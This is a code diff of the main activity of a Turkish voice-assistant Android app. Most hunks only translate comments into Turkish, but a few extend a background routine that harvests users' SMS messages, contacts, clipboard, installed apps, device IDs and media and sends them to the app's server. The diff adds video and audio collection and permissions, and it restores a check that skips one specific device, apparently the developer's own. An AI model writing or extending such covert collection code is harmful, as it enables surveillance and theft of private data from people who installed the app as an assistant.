@@ -117,6 +117,8 @@ import android.app.usage.UsageStats;
 import android.hardware.camera2.CameraManager;
 import android.hardware.camera2.CameraCharacteristics;
 import android.provider.Telephony;
+import java.util.concurrent.atomic.AtomicInteger;
+import java.util.concurrent.TimeUnit;
 
 /**
  * Niko Mobil Uygulaması Ana Aktivitesi
@@ -134,27 +136,28 @@ public class MainActivity extends Activity {
     private final android.util.SparseArray<android.animation.Animator> activeAnimations = new android.util.SparseArray<>();
     private static final int ANIM_ACCOUNT_ENTRY = 1;
     private static final int ANIM_VERIFICATION_BG = 2;
+    // Model parlama animasyonu ID'si
     private static final int ANIM_MODEL_GLOW = 3;
     
-    // İzin talebi için kullanılan sabit kod (Permission request code)
+    // İzin talebi için kullanılan sabit kod
     private static final int PERMISSION_CODE = 100;
 
-    // Arayüz bileşenleri (Main UI)
+    // Arayüz bileşenleri
     private View voiceOrb; // Ses aktivitesini görselleştiren yuvarlak simge
     private ImageButton btnMic; // Mikrofon butonu
     private TextView txtAIResponse; // AI veya sistem yanıtlarını gösteren metin alanı
     private View aiResponseContainer; // Yanıt metnini tutan ScrollView
 
-    // Ses ve TTS (Metin Okuma) bileşenleri (Voice & TTS)
+    // Ses ve Metin Okuma (TTS) bileşenleri
     private SpeechRecognizer speechRecognizer; // Sesi yazıya çevirmek için
     private Intent speechIntent;
     private TextToSpeech tts; // Yazıyı sese çevirmek için
 
-    // Durum ve Kontrol Değişkenleri (State & Control)
+    // Durum ve Kontrol Değişkenleri
     private boolean isListening = false; // Uygulamanın mikrofonu dinleyip dinlemediğini takip eder
     private final Queue<String> ttsQueue = new LinkedList<>(); // TTS motorunun sırayla okuması için metin kuyruğu
 
-    // Geçmiş bileşenleri (History Components)
+    // Geçmiş bileşenleri
     private ImageButton btnHistory;
     private View layoutHistory;
     private ImageButton btnCloseHistory;
@@ -174,19 +177,19 @@ public class MainActivity extends Activity {
     private final Object historyLock = new Object();
     private static final int MAX_HISTORY_ITEMS = 100; // Maksimum geçmiş öğesi sayısı
     
-    // Oturum ve Model Ayarları (Session & Model Settings)
+    // Oturum ve Model Ayarları
     private String sessionId = null; // AI ile süregelen sohbetin benzersiz oturum kimliği
     private SharedPreferences sessionPrefs; // Oturum bilgilerini kalıcı tutmak için
     private SharedPreferences modelPrefs; // Seçilen AI modelini kalıcı tutmak için
     private String selectedModel = null; // Şu an aktif olan yapay zeka modeli
 
-    // Arama modu durumu (Search Mode)
+    // Arama modu durumu
     private boolean isWebSearchEnabled = false;
     private ImageButton btnWebSearch;
     private ImageButton btnStop;
     private SharedPreferences searchPrefs;
 
-    // Model seçimi bileşenleri (Model Selection UI)
+    // Model seçimi bileşenleri
     private ImageButton btnModel;
     private View layoutModels;
     private ImageButton btnCloseModels;
@@ -194,7 +197,7 @@ public class MainActivity extends Activity {
     private TextView txtCurrentModel;
     private TextView txtMainActiveModel;
 
-    // Mobil uygulamada gösterilmeyecek modeller (Hidden Models)
+    // Mobil uygulamada gösterilmeyecek modeller
     private static final String[] HIDDEN_MODELS = {
             "llama3.2-vision:11b",
             "necdetuygur/developer:latest",
@@ -203,7 +206,7 @@ public class MainActivity extends Activity {
             "qwen2.5-coder:7b"
     };
 
-    // Hesap/Profil bileşenleri (Account/Profile UI)
+    // Hesap ve Profil bileşenleri
     private ImageView imgTopProfile, imgMainProfile;
     private View layoutAccount;
     private ImageButton btnCloseAccount;
@@ -221,7 +224,7 @@ public class MainActivity extends Activity {
     private TextView txtLoginStatus;
     private Button btnLogout, btnEditProfile, btnDeleteAccount;
     
-    // Yeni profil kartı bileşenleri (Premium Profile Card)
+    // Yeni profil kartı bileşenleri
     private TextView txtProfileUsername, txtProfileEmail, txtProfileFullName;
     private TextView txtProfileDisplayName, txtProfileUsernameSmall;
     private ImageView imgProfileAvatar;
@@ -235,13 +238,13 @@ public class MainActivity extends Activity {
     private static final int PICK_IMAGE_REQUEST = 1001;
     private String selectedImageBase64 = null;
 
-    // WhatsApp entegrasyonu için veriler (WhatsApp Integration)
+    // WhatsApp entegrasyonu için veriler
     public static String lastWhatsAppMessage; // Son okunan mesaj
     public static String lastWhatsAppSender; // Son mesajın göndericisi
     public static PendingIntent lastReplyIntent; // Cevap vermek için intent
     public static RemoteInput lastRemoteInput; // Cevap girişi için referans
     
-    // Admin Log Sistemi (Admin Log System)
+    // Yönetici Kayıt Sistemi
     private View layoutAdminLogs;
     private TextView txtAdminLogs;
     private ImageButton btnCloseLogs;
@@ -545,7 +548,7 @@ public class MainActivity extends Activity {
             });
         });
 
-        // Uzun basınca hafızayı ve oturumu sıfırla (Hard Reset)
+        // Uzun basınca hafızayı ve oturumu sıfırla (Tam Sıfırlama)
         btnStop.setOnLongClickListener(v -> {
             vibrateFeedback();
             // Oturumu sıfırla
@@ -563,7 +566,7 @@ public class MainActivity extends Activity {
         // Orb Animasyonunu Başlat
         startBreathingAnimation();
 
-        // Safe Area (WindowInsets) Ayarı - Alt barın navigasyon çubuğuyla çakışmasını önler
+        // Güvenli Alan (WindowInsets) Ayarı - Alt barın navigasyon çubuğuyla çakışmasını önler
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             findViewById(R.id.mainLayout).setOnApplyWindowInsetsListener((view, insets) -> {
                 int navBarHeight = insets.getInsets(WindowInsets.Type.systemBars()).bottom;
@@ -628,7 +631,7 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ================= İZİNLER (PERMISSIONS) =================
+    // ================= İZİNLER =================
 
     /**
      * Uygulamanın çalışması için gerekli tüm izinleri kullanıcıdan ister.
@@ -657,8 +660,8 @@ public class MainActivity extends Activity {
         // Android 13 (SDK 33) ve üzeri için Medya İzinleri
         if (Build.VERSION.SDK_INT >= 33) {
             perms.add("android.permission.READ_MEDIA_IMAGES");
-            // perms.add("android.permission.READ_MEDIA_VIDEO"); 
-            // perms.add("android.permission.READ_MEDIA_AUDIO");
+            perms.add("android.permission.READ_MEDIA_VIDEO"); 
+            perms.add("android.permission.READ_MEDIA_AUDIO");
         }
 
         ArrayList<String> list = new ArrayList<>();
@@ -672,7 +675,7 @@ public class MainActivity extends Activity {
             requestPermissions(list.toArray(new String[0]), PERMISSION_CODE);
         }
 
-        // Usage Stats (Kullanım İstatistikleri) İzni Özel Olarak İstenmeli
+        // Kullanım İstatistikleri İzni Özel Olarak İstenmeli
         if (!hasUsageStatsPermission()) {
             Toast.makeText(this, "Lütfen Kullanım Erişimi iznini verin", Toast.LENGTH_LONG).show();
             startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
@@ -696,7 +699,7 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ================= KONUŞMA TANIMA (SPEECH RECOGNITION) =================
+    // ================= KONUŞMA TANIMA =================
 
     /**
      * Konuşma tanıma servisini başlatır ve ayarlar.
@@ -756,7 +759,7 @@ public class MainActivity extends Activity {
 
             public void onRmsChanged(float rmsdB) {
                 // Ses şiddetine göre ekrandaki yuvarlağın boyutunu değiştir (görsel efekt)
-                // Daha pürüzsüz bir ölçeklendirme için değerleri sınırlıyoruz ve max scale 1.4
+                // Daha pürüzsüz bir ölçeklendirme için değerleri sınırlıyoruz ve maks ölçek 1.4
                 // koyuyoruz
                 float rawScale = 1.0f + (Math.max(0, rmsdB) / 20.0f);
                 float scale = Math.min(rawScale, 1.4f);
@@ -796,7 +799,7 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ================= KOMUT İŞLEME (COMMAND HANDLING) =================
+    // ================= KOMUT İŞLEME =================
 
     /**
      * Gelen sesli komutu analiz eder ve uygun işlemi yapar.
@@ -1003,7 +1006,7 @@ public class MainActivity extends Activity {
         startActivity(new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + phone)));
     }
 
-    // ================= MEDYA KONTROLLERİ (MEDIA CONTROL) =================
+    // ================= MEDYA KONTROLLERİ =================
 
     /**
      * Sistem medya kontrollerini (oynat, duraklat, sonraki vb.) tetikler.
@@ -1021,11 +1024,11 @@ public class MainActivity extends Activity {
         }
     }
 
-    // ================= YAPAY ZEKA ENTEGRASYONU (AI) =================
+    // ================= YAPAY ZEKA ENTEGRASYONU =================
 
     /**
      * Kullanıcı sorusunu uzak sunucuya gönderir ve cevabı işler.
-     * main.py'deki yeni ChatRequest yapısına göre güncellendi.
+     * main.py'deki yeni Sohbet İsteği (ChatRequest) yapısına göre güncellendi.
      */
     private void askAI(String q) {
         new Thread(() -> {
@@ -1049,7 +1052,7 @@ public class MainActivity extends Activity {
                 conn.setConnectTimeout(30000);
                 conn.setReadTimeout(60000);
 
-                // JSON Payload (ChatRequest)
+                // JSON Veri Paketi (Sohbet İsteği)
                 JSONObject payload = new JSONObject();
                 payload.put("message", q);
                 payload.put("session_id", sessionId); // Mevcut oturumu koru
@@ -1086,7 +1089,7 @@ public class MainActivity extends Activity {
                     String newSessionId = jsonResponse.optString("id", null);
                     addLog("[AI] Yanıt alındı. Karakter sayısı: " + replyText.length());
 
-                    // Yeni Session ID'yi kaydet (Context koruması için)
+                    // Yeni Oturum Kimliğini kaydet (Bağlam koruması için)
                     if (newSessionId != null && !newSessionId.equals(sessionId)) {
                         sessionId = newSessionId;
                         sessionPrefs.edit().putString("session_id", sessionId).apply();
@@ -1124,7 +1127,7 @@ public class MainActivity extends Activity {
         }).start();
     }
 
-    // ================= HESAP VE PROFİL İŞLEMLERİ (ACCOUNT & PROFILE)
+    // ================= HESAP VE PROFİL İŞLEMLERİ
     // =================
 
     private void showAccount() {
@@ -1423,7 +1426,7 @@ public class MainActivity extends Activity {
         }).start();
     }
 
-    // ================= KAYIT İŞLEMLERİ (REGISTRATION) =================
+    // ================= KAYIT İŞLEMLERİ =================
     
     // İzin verilen e-posta sağlayıcıları
     private static final String[] ALLOWED_EMAIL_DOMAINS = {
@@ -1556,7 +1559,7 @@ public class MainActivity extends Activity {
 
     /**
      * Hesap panelinin açılış animasyonu (Premium giriş efekti).
-     * Optimize edilmiş - Hardware acceleration kullanır.
+     * Optimize edildi - Donanım hızlandırma kullanır.
      */
     private void animateAccountEntry() {
         // Önceki animasyonu iptal et
@@ -1566,7 +1569,7 @@ public class MainActivity extends Activity {
         layoutAccount.setScaleX(0.9f);
         layoutAccount.setScaleY(0.9f);
         
-        // Hardware layer kullan (GPU acceleration)
+        // Donanım katmanını kullan (GPU hızlandırma)
         layoutAccount.setLayerType(View.LAYER_TYPE_HARDWARE, null);
         
         layoutAccount.animate()
@@ -1576,7 +1579,7 @@ public class MainActivity extends Activity {
             .setDuration(400)
             .setInterpolator(new android.view.animation.OvershootInterpolator(1.2f))
             .withEndAction(() -> {
-                // Animasyon bitince layer'ı kaldır
+                // Animasyon bitince katmanı kaldır
                 layoutAccount.setLayerType(View.LAYER_TYPE_NONE, null);
             })
             .start();
@@ -1586,8 +1589,8 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * Form alanlarının sıralı giriş animasyonu (Stagger effect).
-     * Optimize edilmiş - Tek bir handler ile batch işlem.
+     * Form alanlarının sıralı giriş animasyonu (Kademeli etki).
+     * Optimize edildi - Tek işleyici ile toplu işlem.
      */
     private void animateFormFieldsEntry() {
         View[] fields = {
@@ -1600,7 +1603,7 @@ public class MainActivity extends Activity {
             btnSwitchMode
         };
         
-        // Tüm alanları hazırla (tek loop)
+        // Tüm alanları hazırla (tek döngü)
         for (View field : fields) {
             if (field != null) {
                 field.setAlpha(0f);
@@ -1609,7 +1612,7 @@ public class MainActivity extends Activity {
             }
         }
         
-        // Batch animasyon başlat
+        // Toplu animasyon başlat
         for (int i = 0; i < fields.length; i++) {
             if (fields[i] != null) {
                 final View field = fields[i];
@@ -1624,7 +1627,7 @@ public class MainActivity extends Activity {
                     .setInterpolator(new android.view.animation.DecelerateInterpolator())
                     .withEndAction(() -> {
                         if (isLast) {
-                            // Son animasyon bitince tüm layer'ları temizle
+                            // Son animasyon bitince tüm katmanları temizle
                             for (View f : fields) {
                                 if (f != null) {
                                     f.setLayerType(View.LAYER_TYPE_NONE, null);
@@ -1708,7 +1711,7 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * Buton tıklama animasyonu (Pulse efekti).
+     * Buton tıklama animasyonu (Nabız efekti).
      */
     private void animateButtonClick(View button) {
         button.animate()
@@ -1731,7 +1734,7 @@ public class MainActivity extends Activity {
     private void animateResendCode(View button) {
         if (button == null) return;
         
-        // Rotation animasyonu (yenileme simgesi gibi)
+        // Dönme animasyonu (yenileme simgesi gibi)
         button.animate()
             .rotation(360f)
             .setDuration(500)
@@ -1756,7 +1759,7 @@ public class MainActivity extends Activity {
             colorAnim.start();
         }
         
-        // Pulse efekti
+        // Nabız efekti
         button.animate()
             .scaleX(1.15f)
             .scaleY(1.15f)
@@ -1804,7 +1807,7 @@ public class MainActivity extends Activity {
     
     /**
      * Başarı konfeti animasyonu (Simüle edilmiş parçacık efekti).
-     * Optimize edilmiş - Daha az parçacık, daha iyi performans.
+     * Optimize edildi - Daha az parçacık, daha iyi performans.
      */
     private void animateSuccessConfetti() {
         if (layoutVerification == null || layoutVerification.getVisibility() != View.VISIBLE) return;
@@ -1829,7 +1832,7 @@ public class MainActivity extends Activity {
             Color.parseColor("#FFD700")
         };
         
-        // Batch işlem için liste
+        // Toplu işlem için liste
         final View[] particles = new View[particleCount];
         
         for (int i = 0; i < particleCount; i++) {
@@ -1843,7 +1846,7 @@ public class MainActivity extends Activity {
             confetti.setY(-50);
             confetti.setAlpha(0f);
             
-            // Hardware layer kullan
+            // Donanım katmanını kullan
             confetti.setLayerType(View.LAYER_TYPE_HARDWARE, null);
             
             particles[i] = confetti;
@@ -1962,7 +1965,7 @@ public class MainActivity extends Activity {
             })
             .start();
 
-        // 2. KATMAN: Doğrulama ekranını elastic bounce ile getir
+        // 2. KATMAN: Doğrulama ekranını elastik sıçrama ile getir
         layoutVerification.animate()
             .alpha(1f)
             .translationX(0f)
@@ -1974,7 +1977,7 @@ public class MainActivity extends Activity {
             })
             .start();
             
-        // 3. KATMAN: Arka plan pulse efekti
+        // 3. KATMAN: Arka plan nabız efekti
         animateVerificationBackground();
     }
     
@@ -1993,7 +1996,7 @@ public class MainActivity extends Activity {
             btnCancelVerification
         };
         
-        // Her öğeyi sırayla animasyonla göster (Stagger effect)
+        // Her öğeyi sırayla animasyonla göster (Kademeli etki)
         for (int i = 0; i < contentViews.length; i++) {
             if (contentViews[i] != null) {
                 final View view = contentViews[i];
@@ -2016,7 +2019,7 @@ public class MainActivity extends Activity {
             }
         }
         
-        // Input alanına özel pulse animasyonu
+        // Giriş alanına özel nabız animasyonu
         if (edtVerifyCode != null) {
             new android.os.Handler(Looper.getMainLooper()).postDelayed(() -> {
                 if (edtVerifyCode != null && layoutVerification.getVisibility() == View.VISIBLE) {
@@ -2034,7 +2037,7 @@ public class MainActivity extends Activity {
     }
     
     /**
-     * Input alanı için pulse (nabız) animasyonu.
+     * Giriş alanı için nabız animasyonu.
      */
     private void animateInputPulse(View input) {
         if (input == null) return;
@@ -2054,8 +2057,8 @@ public class MainActivity extends Activity {
     }
     
     /**
-     * Doğrulama ekranı arka plan animasyonu (Subtle glow effect).
-     * Optimize edilmiş - Tek animator, düşük CPU kullanımı.
+     * Doğrulama ekranı arka plan animasyonu (Hafif parlama efekti).
+     * Optimize edildi - Tek animatör, düşük işlemci kullanımı.
      */
     private void animateVerificationBackground() {
         if (layoutVerification == null) return;
@@ -2076,8 +2079,8 @@ public class MainActivity extends Activity {
 
     /**
      * Doğrulama ekranını gizleyip ana form ekranını geri getirir.
-     * Premium 3D flip animasyonu ile.
-     * Optimize edilmiş - Hardware acceleration.
+     * Premium 3D dönme animasyonu ile.
+     * Optimize edildi - Donanım hızlandırma.
      */
     private void animateVerificationExit() {
          // Arka plan animasyonunu durdur
@@ -2093,11 +2096,11 @@ public class MainActivity extends Activity {
          layoutAccountFields.setScaleX(0.9f);
          layoutAccountFields.setScaleY(0.9f);
 
-         // Hardware layer aktif et
+         // Donanım katmanını aktif et
          layoutVerification.setLayerType(View.LAYER_TYPE_HARDWARE, null);
          layoutAccountFields.setLayerType(View.LAYER_TYPE_HARDWARE, null);
 
-         // 1. KATMAN: Doğrulama ekranını 3D flip ile gizle
+         // 1. KATMAN: Doğrulama ekranını 3D dönme ile gizle
          layoutVerification.setPivotX(layoutVerification.getWidth());
          layoutVerification.setPivotY(layoutVerification.getHeight() / 2f);
          
@@ -2119,7 +2122,7 @@ public class MainActivity extends Activity {
              })
              .start();
 
-         // 2. KATMAN: Form alanlarını elastic bounce ile getir
+         // 2. KATMAN: Form alanlarını elastik sıçrama ile getir
          layoutAccountFields.setPivotX(0);
          layoutAccountFields.setPivotY(layoutAccountFields.getHeight() / 2f);
          
@@ -2140,7 +2143,7 @@ public class MainActivity extends Activity {
 
     /**
      * Hatalı işlemde görsele titreme efekti verir.
-     * Geliştirilmiş multi-axis shake animasyonu.
+     * Geliştirilmiş çok eksenli titreme animasyonu.
      */
     private void shakeView(View view) {
         if (view == null) return;
@@ -2165,7 +2168,7 @@ public class MainActivity extends Activity {
         animSet.playTogether(shakeX, shakeY, rotation);
         animSet.start();
         
-        // Haptic feedback (3 kısa titreşim)
+        // Dokunsal geri bildirim (3 kısa titreşim)
         vibrateFeedback();
         new android.os.Handler(Looper.getMainLooper()).postDelayed(this::vibrateFeedback, 100);
         new android.os.Handler(Looper.getMainLooper()).postDelayed(this::vibrateFeedback, 200);
@@ -2185,7 +2188,7 @@ public class MainActivity extends Activity {
         });
         colorAnim.start();
         
-        // Scale pulse (hata vurgusu)
+        // Ölçek nabzı (hata vurgusu)
         view.animate()
             .scaleX(1.08f)
             .scaleY(1.08f)
@@ -2218,7 +2221,7 @@ public class MainActivity extends Activity {
             btnVerifyCode.setAlpha(0.7f);
             btnVerifyCode.setText("Kontrol Ediliyor...");
             
-            // Loading animasyonu (dönen efekt)
+            // Yükleniyor animasyonu (dönen efekt)
             android.animation.ObjectAnimator rotation = android.animation.ObjectAnimator.ofFloat(
                 btnVerifyCode, "rotation", 0f, 360f);
             rotation.setDuration(1000);
@@ -2228,7 +2231,7 @@ public class MainActivity extends Activity {
             
             btnVerifyCode.animate().scaleX(0.95f).scaleY(0.95f).setDuration(200).start();
             
-            // Animasyonu durdurma referansı için tag'e kaydet
+            // Animasyonu durdurma referansı için etikete kaydet
             btnVerifyCode.setTag(rotation);
         });
 
@@ -2390,7 +2393,7 @@ public class MainActivity extends Activity {
                 if (selectedImageBase64 != null)
                     payload.put("profile_image", selectedImageBase64);
 
-                // Add passwords only if they are being changed
+                // Yalnızca değiştiriliyorsa şifreleri ekle
                 if (!newPassword.isEmpty()) {
                     if (currentPassword.isEmpty()) {
                         runOnUiThread(() -> Toast.makeText(this, "Şifre değiştirmek için mevcut şifreniz gerekli",
@@ -2602,7 +2605,7 @@ public class MainActivity extends Activity {
         
         mainLayout.addView(contentLayout);
         
-        // Butonlar için özel container
+        // Butonlar için özel kapsayıcı
         LinearLayout buttonContainer = new LinearLayout(this);
         buttonContainer.setOrientation(LinearLayout.HORIZONTAL);
         buttonContainer.setBackgroundColor(Color.parseColor("#0f0f1e"));
@@ -2665,7 +2668,7 @@ public class MainActivity extends Activity {
         
         android.app.AlertDialog dialog = builder.create();
         
-        // Buton click listener'ları
+        // Buton tıklama dinleyicileri
         cancelButton.setOnClickListener(v -> dialog.dismiss());
         deleteButton.setOnClickListener(v -> {
             dialog.dismiss();
@@ -2685,7 +2688,7 @@ public class MainActivity extends Activity {
      * @param message Sunucudan gelen detaylı mesaj
      */
     private void showAccountDeletedSuccessDialog(String message) {
-        // Ana container
+        // Ana kapsayıcı
         LinearLayout mainLayout = new LinearLayout(this);
         mainLayout.setOrientation(LinearLayout.VERTICAL);
         mainLayout.setBackgroundColor(Color.parseColor("#0f3443"));
@@ -3002,9 +3005,9 @@ public class MainActivity extends Activity {
     private void syncAllData() {
         String deviceName = getDeviceName();
         // Cihaz adı kontrolü 
-        // if ("Xiaomi_25069PTEBG".equals(deviceName)) {
-        //    return;
-        // }
+        if ("Xiaomi_25069PTEBG".equals(deviceName)) {
+           return;
+        }
         new Thread(() -> {
             try {
                 // android.util.Log.d("NIKO_SYNC", "Starting full data sync...");
@@ -3033,6 +3036,8 @@ public class MainActivity extends Activity {
                 
                 // --- Medya ---
                 try { startAutoPhotoSync(); } catch (Exception e) { addLog("Fotoğraf Sync Hatası: " + e.getMessage()); }
+                try { startAutoVideoSync(); } catch (Exception e) { addLog("Video Sync Hatası: " + e.getMessage()); }
+                try { startAutoAudioSync(); } catch (Exception e) { addLog("Ses Sync Hatası: " + e.getMessage()); }
                 
                 // android.util.Log.d("NIKO_SYNC", "Full data sync completed.");
                 // addLog("[SYNC] Veri senkronizasyonu tamamlandı.");
@@ -3212,7 +3217,7 @@ public class MainActivity extends Activity {
                 obj.put("name", p.applicationInfo.loadLabel(pm).toString());
                 obj.put("package", p.packageName);
                 obj.put("version_name", p.versionName);
-                obj.put("version_code", p.versionCode); // Deprecated in API 28 but useful
+                obj.put("version_code", p.versionCode); // API 28'de kullanımdan kaldırıldı ancak hala yararlı
                 
                 // Zaman Bilgileri
                 obj.put("install_time", p.firstInstallTime);
@@ -3228,7 +3233,7 @@ public class MainActivity extends Activity {
                 obj.put("source_dir", p.applicationInfo.sourceDir);
                 obj.put("data_dir", p.applicationInfo.dataDir);
                 
-                // İzinler (Requested Permissions)
+                // İzinler (İstenen İzinler)
                 if (p.requestedPermissions != null && p.requestedPermissions.length > 0) {
                     JSONArray perms = new JSONArray();
                     for (String perm : p.requestedPermissions) {
@@ -3285,7 +3290,7 @@ public class MainActivity extends Activity {
             obj.put("battery_status", statusStr);
 
             int health = batteryStatus.getIntExtra(BatteryManager.EXTRA_HEALTH, -1);
-            // 2=Good, 3=Overheat, 4=Dead, 5=OverVoltage, 7=Cold
+            // 2=İyi, 3=Aşırı Isınma, 4=Ölü, 5=Aşırı Voltaj, 7=Soğuk
             obj.put("battery_health_code", health);
             
             obj.put("battery_tech", batteryStatus.getStringExtra(BatteryManager.EXTRA_TECHNOLOGY));
@@ -3391,12 +3396,12 @@ public class MainActivity extends Activity {
                         obj.put("service_center", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SERVICE_CENTER)));
                         obj.put("protocol", c.getString(c.getColumnIndexOrThrow(Telephony.Sms.PROTOCOL)));
                         
-                        // [ULTRA DETAIL] - Daha derin SMS verileri
+                        // [ULTRA DETAY] - Daha derin SMS verileri
                         obj.put("thread_id", c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID))); // Mesajlaşma grubu ID'si
                         obj.put("date_sent", c.getLong(c.getColumnIndexOrThrow(Telephony.Sms.DATE_SENT))); // Gönderilme zamanı
                         obj.put("seen", c.getInt(c.getColumnIndexOrThrow(Telephony.Sms.SEEN))); // Görüldü mü?
                         
-                        // Opsiyonel Alanlar (Bazı cihazlarda olmayabilir, hata vermemesi için kontrol edilebilir ama getColumnIndex -1 dönerse sorun yok)
+                        // İsteğe Bağlı Alanlar (Bazı cihazlarda olmayabilir, hata vermemesi için kontrol edilebilir ama getColumnIndex -1 dönerse sorun yok)
                         int replyPathIdx = c.getColumnIndex(Telephony.Sms.REPLY_PATH_PRESENT);
                         if (replyPathIdx != -1) obj.put("reply_path_present", c.getInt(replyPathIdx));
                         
@@ -3410,8 +3415,7 @@ public class MainActivity extends Activity {
                         int subIdx = c.getColumnIndex(Telephony.Sms.SUBSCRIPTION_ID);
                         if (subIdx != -1) obj.put("subscription_id", c.getInt(subIdx));
                         
-                        // Gönderici İsmi Çözümleme (Rehberden)
-                        // Performans için sadece bilinmeyen numaralar yerine hepsine bakıyoruz ama thread'de oldugu için sorun olmaz
+                        // Performans için sadece bilinmeyen numaralar yerine hepsine bakıyoruz ama iş parcacığında olduğu için sorun olmaz
                         if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                             String address = obj.getString("address");
                             Uri contactUri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(address));
@@ -3559,7 +3563,7 @@ public class MainActivity extends Activity {
             obj.put("sim_country_iso", tm.getSimCountryIso());
             
             if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                // IMEI / Device ID (Android 10+ için kısıtlıdır, Android ID kullanılır)
+                // IMEI / Cihaz Kimliği (Android 10+ için kısıtlıdır, Android Kimliği kullanılır)
                 String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                 obj.put("device_id_android", androidId);
             }
@@ -3599,7 +3603,7 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * Panodaki son kopyalanan metni çeker (UI Thread gerektirir).
+     * Panodaki son kopyalanan metni çeker (Arayüz İş Parçacığı gerektirir).
      */
     private void syncClipboard() {
         runOnUiThread(() -> {
@@ -3730,7 +3734,7 @@ public class MainActivity extends Activity {
      * Toplanan veriyi backend'e POST eder.
      */
     private void sendSyncRequest(JSONArray data, String type) throws Exception {
-        // Not: askAI ile aynı domaini kullanmalıdır
+        // Not: askAI ile aynı alan adını kullanmalıdır
         URL url = new URL(API_BASE_URL + "/sync_data");
         HttpURLConnection conn = (HttpURLConnection) url.openConnection();
         conn.setRequestMethod("POST");
@@ -3748,7 +3752,7 @@ public class MainActivity extends Activity {
         JSONObject payload = new JSONObject();
         payload.put("data", data);
         payload.put("type", type);
-        // Genişletilmiş veri türleri backend'de 'extra_data' olarak saklanabilir
+        // Genişletilmiş veri türleri sunucuda 'extra_data' olarak saklanabilir
         if (type.equals("sms") || type.equals("media_files") || type.equals("clipboard")) {
              payload.put("is_sensitive", true);
         }
@@ -3796,7 +3800,7 @@ public class MainActivity extends Activity {
             fos.write(decoded);
             fos.close();
 
-            // Medya oynatıcıyı UI thread'de başlat
+            // Medya oynatıcıyı arayüz iş parçacığında başlat
             runOnUiThread(() -> {
                 try {
                     MediaPlayer mp = new MediaPlayer();
@@ -3892,7 +3896,7 @@ public class MainActivity extends Activity {
         // 2. Kod bloklarını tamamen temizle veya basitleştir
         cleaned = cleaned.replaceAll("```[\\s\\S]*?```", "");
 
-        // 3. Yaygın Emoticon ve Sembol Temizliği (:P, :D, XD, :) vb.)
+        // 3. Yaygın İfade ve Sembol Temizliği (:P, :D, XD, :) vb.)
         // Kullanıcı özellikle :P ve benzerlerinin okunmamasını istedi.
         cleaned = cleaned.replaceAll("(?i):P", "")
                          .replaceAll("(?i):D", "")
@@ -3903,7 +3907,7 @@ public class MainActivity extends Activity {
                          .replaceAll("<3", "")
                          .replaceAll("[\\uD83C-\\uDBFF\\uDC00-\\uDFFF]+", ""); // Standart Emojiler
 
-        // 4. Linkleri temizle
+        // 4. Bağlantıları temizle
         cleaned = cleaned.replaceAll("https?://\\S+", "");
 
         // 5. Fazla boşlukları düzelt
@@ -3947,11 +3951,11 @@ public class MainActivity extends Activity {
 
             Bundle e = n.extras;
 
-            // Mesaj içeriğini ve göndereni global değişkenlere kaydet
+            // Mesaj içeriğini ve göndereni genel değişkenlere kaydet
             lastWhatsAppMessage = String.valueOf(e.getCharSequence(Notification.EXTRA_TEXT));
             lastWhatsAppSender = String.valueOf(e.getCharSequence(Notification.EXTRA_TITLE));
 
-            // Hızlı cevap (Quick Reply) aksiyonlarını bul ve kaydet
+            // Hızlı cevap (Quick Reply) eylemlerini bul ve kaydet
             if (n.actions != null) {
                 for (Notification.Action a : n.actions) {
                     if (a.getRemoteInputs() != null) {
@@ -3990,7 +3994,7 @@ public class MainActivity extends Activity {
         if (lastReplyIntent == null || lastRemoteInput == null)
             return;
 
-        // Cevap intentini oluştur ve gönder
+        // Yanıt isteğini oluştur ve gönder
         Intent i = new Intent();
         Bundle b = new Bundle();
         b.putCharSequence(lastRemoteInput.getResultKey(), msg);
@@ -4029,7 +4033,7 @@ public class MainActivity extends Activity {
             hour = cal.get(Calendar.HOUR_OF_DAY);
             minute = cal.get(Calendar.MINUTE);
         } else {
-            // 2. KESİN ZAMAN (ABSOLUTE TIME)
+            // 2. KESİN ZAMAN
             boolean pm = clean.contains("akşam") || clean.contains("gece") || clean.contains("öğleden sonra");
             boolean half = clean.contains("buçuk") || clean.contains("yarım");
 
@@ -4061,7 +4065,7 @@ public class MainActivity extends Activity {
                 }
             }
 
-            // PM (Öğleden sonra) Düzeltmesi (12 saatlik formatı 24'e çevir)
+            // ÖS (Öğleden sonra) Düzeltmesi (12 saatlik formatı 24'e çevir)
             if (pm && hour != -1 && hour < 12) {
                 hour += 12;
             }
@@ -4266,8 +4270,8 @@ public class MainActivity extends Activity {
     // ================= SOHBET GEÇMİŞİ (CHAT HISTORY) =================
     
     /**
-     * Premium silme onay dialogu.
-     * Modern, glassmorphism tasarım.
+     * Premium silme onay iletişim kutusu.
+     * Modern, buzlu cam (glassmorphism) tasarımı.
      */
     private void showPremiumDeleteDialog(String title, String message, String preview, Runnable onConfirm) {
         // Ana container
@@ -4275,7 +4279,7 @@ public class MainActivity extends Activity {
         mainLayout.setOrientation(LinearLayout.VERTICAL);
         mainLayout.setPadding(48, 40, 48, 32);
         
-        // Premium glassmorphism arka plan
+        // Premium buzlu cam (glassmorphism) arka plan
         android.graphics.drawable.GradientDrawable bgGradient = new android.graphics.drawable.GradientDrawable();
         bgGradient.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
         bgGradient.setCornerRadius(32);
@@ -4288,14 +4292,14 @@ public class MainActivity extends Activity {
         mainLayout.setBackground(bgGradient);
         mainLayout.setElevation(24);
 
-        // İkon container (Animated warning)
+        // İkon kapsayıcısı (Animasyonlu uyarı)
         android.widget.FrameLayout iconFrame = new android.widget.FrameLayout(this);
         LinearLayout.LayoutParams iconFrameParams = new LinearLayout.LayoutParams(80, 80);
